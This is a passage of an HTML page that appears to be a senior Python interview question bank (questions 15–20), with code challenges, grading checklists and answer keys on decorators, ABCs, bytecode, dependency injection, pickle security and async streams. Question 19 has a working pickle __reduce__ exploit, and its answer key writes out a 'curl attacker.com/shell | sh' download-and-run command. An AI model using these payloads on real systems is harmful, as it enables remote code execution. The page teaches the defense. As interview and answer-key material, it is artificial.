+<strong>Part A:</strong> Why does omitting <code>@functools.wraps(fn)</code> break API documentation generators (like FastAPI Swagger/OpenAPI, Sphinx) and function identity (e.g. <code>fn.__name__</code>, <code>fn.__doc__</code>, <code>fn.__annotations__</code>)?
+<br>
+<strong>Part B:</strong> What is closure variable capture? How do decorators maintain state between invocations, and how do you prevent late-binding closure bugs?
+<br>
+<strong>Part C:</strong> Implement a production-grade parameterized decorator that uses <code>inspect.signature(fn).bind(*args, **kwargs)</code> to inspect arbitrary argument values by parameter name regardless of whether they were passed as positional or keyword arguments.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('15', 'custom_decorator.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-15" style="display:none;">import time
+from typing import Callable, Any
+
+def naive_rate_limiter(fn: Callable):
+    # BUG: Lacks @functools.wraps; overwrites __name__, __doc__, __annotations__!
+    def wrapper(*args, **kwargs):
+        print(f&quot;Calling function: {fn.__name__}&quot;)
+        return fn(*args, **kwargs)
+    return wrapper
+
+@naive_rate_limiter
+def process_order(order_id: str, amount: float) -&gt; bool:
+    &quot;&quot;&quot;Processes customer checkout.&quot;&quot;&quot;
+    return True
+
+print(process_order.__name__) # Prints &#x27;wrapper&#x27; instead of &#x27;process_order&#x27;!
+print(process_order.__doc__)  # Prints None!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-15">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 15, 1, 'Decorator Mechanics, Closures & Metadata Preservation: Writing parameterized decorators, understanding closure scope, pr')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 15, 2, 'Decorator Mechanics, Closures & Metadata Preservation: Writing parameterized decorators, understanding closure scope, pr')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 15, 3, 'Decorator Mechanics, Closures & Metadata Preservation: Writing parameterized decorators, understanding closure scope, pr')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 15, 4, 'Decorator Mechanics, Closures & Metadata Preservation: Writing parameterized decorators, understanding closure scope, pr')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-15">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain that decorators replace the original function object with the inner wrapper function object in the module namespace?</li>
+<li>Do they explain <code>@functools.wraps</code> copies <code>__name__</code>, <code>__doc__</code>, <code>__module__</code>, <code>__annotations__</code>, and sets <code>__wrapped__</code>?</li>
+<li>Do they write a 3-tier decorator for receiving arguments: <code>def rate_limit(rate): def decorator(fn): def wrapper(...): ...</code>?</li>
+<li>Do they use <code>sig = inspect.signature(fn); bound = sig.bind(*args, **kwargs); bound.apply_defaults()</code>?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Why functools.wraps is Critical:</strong><br>
+A decorator binds the function identifier to the wrapper closure returned by the decorator. Without <code>@functools.wraps(fn)</code>, the original function's name becomes <code>'wrapper'</code>, docstrings are lost, type annotations disappear, and inspect tools cannot determine the original parameter signature. <code>@functools.wraps</code> updates the wrapper with attributes from the original function and sets <code>__wrapped__</code> to point to the unwrapped target.<br><br>
+<strong>2. Parameterized Decorator with inspect.signature Binding:</strong><br>
+<pre><code>import functools
+import inspect
+from typing import Callable, Any
+
+def audit_argument(arg_name: str) -> Callable:
+    def decorator(fn: Callable) -> Callable:
+        sig = inspect.signature(fn)
+
+        @functools.wraps(fn)
+        def wrapper(*args: Any, **kwargs: Any) -> Any:
+            # Bind args and kwargs to formal parameters regardless of call style
+            bound_args = sig.bind(*args, **kwargs)
+            bound_args.apply_defaults()
+            
+            target_value = bound_args.arguments.get(arg_name)
+            print(f"[AUDIT] Inspected argument '{arg_name}' = {target_value}")
+            
+            return fn(*args, **kwargs)
+        return wrapper
+    return decorator
+
+@audit_argument("order_id")
+def place_order(order_id: str, amount: float = 0.0) -> bool:
+    return True</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-16" data-keywords="abc abstractmethod virtual subclass register collections.abc isinstance">
+                    <div class="card-header">
+                        <span class="concept-badge">Abstract Base Classes &amp; Virtual Subclasses</span>
+                        <span class="q-number">Question 16 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Abstract Base Classes (ABCs) & Virtual Subclasses</strong>: Enforcing interfaces with <code>abc.ABCMeta</code>, runtime type checking, and registering virtual subclasses with <code>register()</code> to decouple third-party libraries.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                You are standardizing an internal storage engine. You want an abstract interface <code>BlobStorage</code> that defines <code>upload(path, data)</code> and <code>download(path)</code>. A popular open-source S3 library provides these methods, but does NOT inherit from your <code>BlobStorage</code> class.
+<br><br>
+<strong>Part A:</strong> How does <code>abc.ABCMeta</code> enforce that classes with <code>@abstractmethod</code> cannot be instantiated directly?
+<br>
+<strong>Part B:</strong> What is a <strong>Virtual Subclass</strong> in Python? How does <code>BlobStorage.register(ThirdPartyS3Client)</code> allow <code>isinstance(s3_client, BlobStorage)</code> to return <code>True</code> without touching the third-party source code?
+<br>
+<strong>Part C:</strong> What is <code>__subclasshook__</code> in <code>collections.abc</code>, and how does it implement automated runtime structural duck-typing for ABCs?
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('16', 'blob_storage_abc.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-16" style="display:none;">import abc
+from typing import bytes
+
+class BlobStorage(abc.ABC):
+    @abc.abstractmethod
+    def upload(self, path: str, data: bytes) -&gt; bool:
+        pass
+
+    @abc.abstractmethod
+    def download(self, path: str) -&gt; bytes:
+        pass
+
+# Third-party class from external pip package:
+class ExternalAwsS3Client:
+    def upload(self, path: str, data: bytes) -&gt; bool:
+        return True
+
+    def download(self, path: str) -&gt; bytes:
+        return b&quot;data&quot;
+
+# Goal: Make isinstance(client, BlobStorage) return True WITHOUT modifying ExternalAwsS3Client!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-16">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 16, 1, 'Abstract Base Classes (ABCs) & Virtual Subclasses: Enforcing interfaces with abc.ABCMeta, runtime type checking, and reg')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 16, 2, 'Abstract Base Classes (ABCs) & Virtual Subclasses: Enforcing interfaces with abc.ABCMeta, runtime type checking, and reg')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 16, 3, 'Abstract Base Classes (ABCs) & Virtual Subclasses: Enforcing interfaces with abc.ABCMeta, runtime type checking, and reg')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 16, 4, 'Abstract Base Classes (ABCs) & Virtual Subclasses: Enforcing interfaces with abc.ABCMeta, runtime type checking, and reg')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-16">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain <code>abc.ABCMeta</code> checks for any remaining abstract methods during <code>__new__</code>/<code>__init__</code> and raises <code>TypeError: Can't instantiate abstract class</code>?</li>
+<li>Do they explain <code>ABCMeta.register()</code> adds the target class to a weak set of virtual subclasses?</li>
+<li>Do they note that virtual subclasses pass <code>isinstance()</code> and <code>issubclass()</code> but do NOT inherit implementation methods from the ABC?</li>
+<li>Do they implement <code>__subclasshook__(cls, C)</code> to check method signatures dynamically?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. ABC Instantiation Enforcement:</strong><br>
+When a class using <code>ABCMeta</code> is defined, Python scans for functions decorated with <code>@abstractmethod</code> and compiles a set in <code>__abstractmethods__</code>. When <code>BaseClass()</code> is called, <code>type.__call__</code> checks if this set is non-empty; if so, it aborts instantiation with <code>TypeError: Can't instantiate abstract class with abstract methods ...</code>.<br><br>
+<strong>2. Virtual Subclassing with register():</strong><br>
+<pre><code># Register the 3rd-party client as a virtual subclass of our ABC:
+BlobStorage.register(ExternalAwsS3Client)
+
+client = ExternalAwsS3Client()
+print(isinstance(client, BlobStorage)) # True!
+print(issubclass(ExternalAwsS3Client, BlobStorage)) # True!</code></pre><br>
+<strong>Critical Architectural Distinction:</strong> Virtual subclasses pass <code>isinstance()</code> and <code>issubclass()</code> type checks, but they do <em>not</em> inherit any concrete methods, attributes, or mixins from the ABC (their MRO is not modified).<br><br>
+<strong>3. Dynamic Resolution via __subclasshook__:</strong><br>
+<pre><code>class DynamicBlobStorage(abc.ABC):
+    @classmethod
+    def __subclasshook__(cls, subclass):
+        # Automatically registers any class that implements upload and download!
+        has_upload = any("upload" in B.__dict__ for B in subclass.__mro__)
+        has_download = any("download" in B.__dict__ for B in subclass.__mro__)
+        return has_upload and has_download</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-17" data-keywords="bytecode dis dis.dis opcode virtual machine load_fast load_global optimization">
+                    <div class="card-header">
+                        <span class="concept-badge">Bytecode &amp; CPython Execution VM</span>
+                        <span class="q-number">Question 17 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>CPython Bytecode & Virtual Machine Internals</strong>: Inspecting bytecode with <code>dis</code>, understanding stack-based virtual machine execution, local variable lookups (<code>LOAD_FAST</code>) vs global lookups (<code>LOAD_GLOBAL</code>), and loop optimization.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A latency-sensitive algorithmic calculation runs in an inner loop millions of times per second. A senior engineer refactors a standard <code>for</code> loop into a local variable reference and list comprehension, speeding up execution by 35%. Look at the code.
+<br><br>
+<strong>Part A:</strong> How does CPython's stack-based bytecode evaluation loop (<code>ceval.c</code>) execute bytecode?
+<br>
+<strong>Part B:</strong> Explain the operational difference between <code>LOAD_GLOBAL</code> (hash table lookup in global and builtin dictionaries) and <code>LOAD_FAST</code> (indexed C-array offset lookup for local variables).
+<br>
+<strong>Part C:</strong> Use the <code>dis</code> module to analyze the bytecode generated for <code>math.sin()</code> lookup inside a loop versus aliasing it to a local variable <code>sin = math.sin</code>.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('17', 'bytecode_bench.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-17" style="display:none;">import dis
+import math
+
+def slow_loop():
+    # Looks up &#x27;math&#x27; and then &#x27;sin&#x27; on every single iteration!
+    total = 0.0
+    for i in range(1_000_000):
+        total += math.sin(i)
+    return total
+
+def fast_loop():
+    # Local variable aliasing speeds up execution significantly!
+    total = 0.0
+    sin = math.sin # Local cache
+    for i in range(1_000_000):
+        total += sin(i)
+    return total</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-17">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 17, 1, 'CPython Bytecode & Virtual Machine Internals: Inspecting bytecode with dis, understanding stack-based virtual machine ex')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 17, 2, 'CPython Bytecode & Virtual Machine Internals: Inspecting bytecode with dis, understanding stack-based virtual machine ex')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 17, 3, 'CPython Bytecode & Virtual Machine Internals: Inspecting bytecode with dis, understanding stack-based virtual machine ex')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 17, 4, 'CPython Bytecode & Virtual Machine Internals: Inspecting bytecode with dis, understanding stack-based virtual machine ex')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-17">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain CPython is a stack-based virtual machine where instructions push and pop pointers to <code>PyObject</code>?</li>
+<li>Do they explain <code>LOAD_FAST</code> accesses the local variable frame array by index $O(1)$ directly, whereas <code>LOAD_GLOBAL</code> searches the global <code>__dict__</code> then builtins <code>__dict__</code>?</li>
+<li>Do they use <code>dis.dis(slow_loop)</code> and demonstrate how <code>LOAD_GLOBAL</code> + <code>LOAD_ATTR</code> in an inner loop consumes excessive cycles?</li>
+<li>Do they discuss comprehension bytecode optimizations in Python 3.11/3.12 (Specialized Adaptive Interpreter / PEP 659)?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. CPython VM Evaluation:</strong><br>
+CPython compiles Python code into bytecode instructions executed by an evaluation loop in C (<code>ceval.c</code>). The VM is stack-based: values are loaded onto an evaluation stack, operations pop operands and push results.<br><br>
+<strong>2. LOAD_GLOBAL vs LOAD_FAST:</strong><br>
+• <strong>LOAD_FAST:</strong> During compilation, Python analyzes local variable names and assigns each a fixed integer index in the <code>f_localsplus</code> C array of the stack frame. Looking up a local variable is a single C array dereference: $O(1)$ pointer retrieval.<br>
+• <strong>LOAD_GLOBAL + LOAD_ATTR:</strong> <code>math.sin(i)</code> performs a dictionary lookup in the module's <code>__dict__</code> for <code>'math'</code>, and then a dictionary lookup on the <code>math</code> module object for <code>'sin'</code>. In an inner loop running $10^6$ times, this performs $2 \times 10^6$ dictionary hash table lookups.<br><br>
+<strong>3. Bytecode Disassembly:</strong><br>
+<pre><code># In slow_loop:
+# LOAD_GLOBAL 1 (math) -> LOAD_ATTR 2 (sin) -> LOAD_FAST 0 (i) -> CALL
+
+# In fast_loop:
+# LOAD_FAST 1 (sin) -> LOAD_FAST 0 (i) -> CALL</code></pre><br>
+Aliasing <code>sin = math.sin</code> replaces dynamic dictionary resolution with <code>LOAD_FAST</code>, yielding dramatic speedups in hot computational loops.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-18" data-keywords="dependency injection clean architecture hexagonal ports adapters protocol factory">
+                    <div class="card-header">
+                        <span class="concept-badge">Clean Architecture &amp; Dependency Injection</span>
+                        <span class="q-number">Question 18 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Clean Architecture & Dependency Inversion in Python</strong>: Implementing Hexagonal Architecture (Ports and Adapters) using native Python protocols and dependency containers without heavy third-party DI frameworks.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                Your organization is adopting Domain-Driven Design (DDD) and Hexagonal Architecture for a core payment microservice. You want business logic completely decoupled from database technologies (Postgres vs DynamoDB) and messaging brokers (Kafka vs RabbitMQ).
+<br><br>
+<strong>Part A:</strong> What is the Dependency Inversion Principle (DIP)? How does having high-level business services depend on abstract interfaces (Ports) invert traditional architectural dependencies?
+<br>
+<strong>Part B:</strong> In the snippet, why is directly importing and instantiating <code>PostgresOrderRepository</code> inside <code>OrderService</code> a severe violation of clean architecture?
+<br>
+<strong>Part C:</strong> Refactor the system using Python <code>typing.Protocol</code> for the Port, concrete Adapters, and an explicit dependency injection container or factory function.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('18', 'hexagonal_di.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-18" style="display:none;"># VIOLATION: Domain service tightly coupled to specific database driver!
+from typing import Dict, Any
+
+class PostgresOrderRepository:
+    def save(self, order_id: str, data: Dict[str, Any]) -&gt; None:
+        print(f&quot;Executing SQL: INSERT INTO orders VALUES (&#x27;{order_id}&#x27;)&quot;)
+
+class OrderService:
+    def __init__(self):
+        # HARD TIE: Cannot unit test without spinning up real Postgres database!
+        self.repo = PostgresOrderRepository()
+
+    def create_order(self, order_id: str, amount: float) -&gt; bool:
+        if amount &lt;= 0:
+            raise ValueError(&quot;Invalid amount&quot;)
+        self.repo.save(order_id, {&quot;amount&quot;: amount})
+        return True</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-18">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 18, 1, 'Clean Architecture & Dependency Inversion in Python: Implementing Hexagonal Architecture (Ports and Adapters) using nati')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 18, 2, 'Clean Architecture & Dependency Inversion in Python: Implementing Hexagonal Architecture (Ports and Adapters) using nati')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 18, 3, 'Clean Architecture & Dependency Inversion in Python: Implementing Hexagonal Architecture (Ports and Adapters) using nati')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 18, 4, 'Clean Architecture & Dependency Inversion in Python: Implementing Hexagonal Architecture (Ports and Adapters) using nati')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-18">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that instantiating concrete database drivers inside the domain service violates the Dependency Inversion Principle?</li>
+<li>Do they explain unit testing is impossible without mocking or external dependencies?</li>
+<li>Do they define a clean Port interface using <code>typing.Protocol</code>?</li>
+<li>Do they implement constructor injection: <code>def __init__(self, repo: OrderRepositoryPort): self.repo = repo</code>?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Architectural Inversion:</strong><br>
+Traditional architecture flows downward: High-level business rules depend on lower-level database details. The Dependency Inversion Principle dictates that high-level modules should not depend on low-level modules; both should depend on abstractions. The domain core defines its required contract (Port), and the infrastructure implements it (Adapter).<br><br>
+<strong>2. Clean Hexagonal Implementation:</strong><br>
+<pre><code>from typing import Protocol, Dict, Any
+
+# 1. The PORT (Defined in Domain Core)
+class OrderRepositoryPort(Protocol):
+    def save(self, order_id: str, data: Dict[str, Any]) -> None: ...
+
+# 2. The DOMAIN SERVICE (Pure Business Logic)
+class OrderService:
+    def __init__(self, repo: OrderRepositoryPort):
+        # Injected dependency: Completely decoupled from Postgres/DynamoDB
+        self.repo = repo
+
+    def create_order(self, order_id: str, amount: float) -> bool:
+        if amount <= 0:
+            raise ValueError("Invalid amount")
+        self.repo.save(order_id, {"amount": amount})
+        return True
+
+# 3. Concrete ADAPTERS (Infrastructure Layer)
+class PostgresOrderAdapter:
+    def save(self, order_id: str, data: Dict[str, Any]) -> None:
+        # Postgres driver logic here
+        pass
+
+class InMemoryMockOrderAdapter:
+    def __init__(self): self.storage = {}
+    def save(self, order_id: str, data: Dict[str, Any]) -> None:
+        self.storage[order_id] = data</code></pre><br>
+Unit tests can now inject <code>InMemoryMockOrderAdapter</code> instantly without database drivers or network mocks.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-19" data-keywords="pickle rce remote code execution serialization __reduce__ security json hmac">
+                    <div class="card-header">
+                        <span class="concept-badge">Security &amp; Serialization Vulnerabilities</span>
+                        <span class="q-number">Question 19 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Security & Object Deserialization Pitfalls</strong>: Remote Code Execution (RCE) vulnerabilities via <code>pickle</code> deserialization (<code>__reduce__</code> exploit), and building secure, tamper-proof serialization pipelines.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A legacy distributed microservice caches user session objects in Redis using Python's native <code>pickle.dumps()</code> and retrieves them via <code>pickle.loads()</code>. A security audit flags this as a Critical Severity Remote Code Execution (RCE) vulnerability.
+<br><br>
+<strong>Part A:</strong> Explain how an attacker can craft an arbitrary payload using Python's <code>__reduce__</code> protocol to achieve remote shell code execution upon <code>pickle.loads()</code>.
+<br>
+<strong>Part B:</strong> Why is 'never unpickle untrusted data' an ironclad rule in Python? Can you sanitize or sandbox <code>pickle</code> safely?
+<br>
+<strong>Part C:</strong> Refactor the caching pipeline to use strict JSON serialization coupled with HMAC-SHA256 digital signing to guarantee both schema safety and cryptographic tamper-proofing.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('19', 'pickle_exploit.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-19" style="display:none;">import pickle
+import os
+
+# Exploit demonstration:
+class MaliciousPayload:
+    def __reduce__(self):
+        # __reduce__ returns a callable and arguments to execute upon unpickling
+        cmd = &quot;echo &#x27;PWNED: Arbitrary Remote Command Executed!&#x27; &gt; /tmp/pwned.txt&quot;
+        return (os.system, (cmd,))
+
+# Attacker generates serialized payload:
+serialized_exploit = pickle.dumps(MaliciousPayload())
+
+# Target server receives payload from Redis / Network:
+# CRITICAL VULNERABILITY: Deserialization executes os.system() instantly!
+pickle.loads(serialized_exploit)</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-19">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 19, 1, 'Security & Object Deserialization Pitfalls: Remote Code Execution (RCE) vulnerabilities via pickle deserialization (__re')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 19, 2, 'Security & Object Deserialization Pitfalls: Remote Code Execution (RCE) vulnerabilities via pickle deserialization (__re')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 19, 3, 'Security & Object Deserialization Pitfalls: Remote Code Execution (RCE) vulnerabilities via pickle deserialization (__re')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 19, 4, 'Security & Object Deserialization Pitfalls: Remote Code Execution (RCE) vulnerabilities via pickle deserialization (__re')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-19">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that <code>pickle</code> is not just a data format, but a virtual machine that reconstructs Python objects by executing arbitrary callables returned by <code>__reduce__</code>?</li>
+<li>Do they explain that <code>pickle.loads</code> on untrusted data grants full system compromise (RCE)?</li>
+<li>Do they reject trying to 'filter' pickle classes with custom unpicklers?</li>
+<li>Do they implement secure JSON serialization accompanied by HMAC signature verification?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. The Mechanics of the Pickle Exploit:</strong><br>
+Python's <code>pickle</code> protocol uses the <code>__reduce__</code> method to determine how an object should be deconstructed and reconstructed. <code>__reduce__</code> returns a tuple <code>(callable, args)</code>. When <code>pickle.loads()</code> deserializes the byte stream, it automatically calls <code>callable(*args)</code>. An attacker can set <code>callable = os.system</code> and <code>args = ('curl attacker.com/shell | sh',)</code>. The interpreter executes the shell command with the privileges of the Python process before returning.<br><br>
+<strong>2. Cryptographically Signed Secure Serialization:</strong><br>
+<pre><code>import json
+import hmac
+import hashlib
+from typing import Dict, Any
+
+class SecureSerializer:
+    def __init__(self, secret_key: bytes):
+        self.secret_key = secret_key
+
+    def serialize(self, data: Dict[str, Any]) -> str:
+        payload = json.dumps(data, separators=(',', ':')).encode('utf-8')
+        signature = hmac.new(self.secret_key, payload, hashlib.sha256).hexdigest()
+        return f"{signature}.{payload.decode('utf-8')}"
+
+    def deserialize(self, signed_data: str) -> Dict[str, Any]:
+        signature, _, payload_str = signed_data.partition('.')
+        payload = payload_str.encode('utf-8')
+        expected_sig = hmac.new(self.secret_key, payload, hashlib.sha256).hexdigest()
+        
+        # Constant-time comparison prevents timing attacks
+        if not hmac.compare_digest(signature, expected_sig):
+            raise ValueError("Tampered or invalid cryptographic signature!")
+            
+        return json.loads(payload_str)</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-20" data-keywords="async iterator __aiter__ __anext__ async generator backpressure streaming">
+                    <div class="card-header">
+                        <span class="concept-badge">Asynchronous Iterators &amp; Streaming Backpressure</span>
+                        <span class="q-number">Question 20 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Asynchronous Iterators & Reactive Backpressure</strong>: Implementing custom async iterators with <code>__aiter__</code> and <code>__anext__</code>, managing flow control/backpressure, and handling client disconnection cleanup.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                You are building a real-time market data streaming service that ingests high-frequency stock exchange ticks over an asynchronous TCP socket and streams them to client coroutines. Look at the code.
+<br><br>
+<strong>Part A:</strong> What is the formal Python asynchronous iterator protocol (<code>__aiter__</code> and <code>__anext__</code>)? How does raising <code>StopAsyncIteration</code> terminate an <code>async for</code> loop?
+<br>
+<strong>Part B:</strong> In high-throughput streaming, what is <strong>backpressure</strong>? What happens if a slow consumer cannot process ticks as quickly as the network pushes them?
+<br>
+<strong>Part C:</strong> Implement a robust <code>AsyncTickStream</code> class with a bounded <code>asyncio.Queue</code> that applies backpressure (throttles the producer or drops stale ticks) and handles consumer disconnects cleanly.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
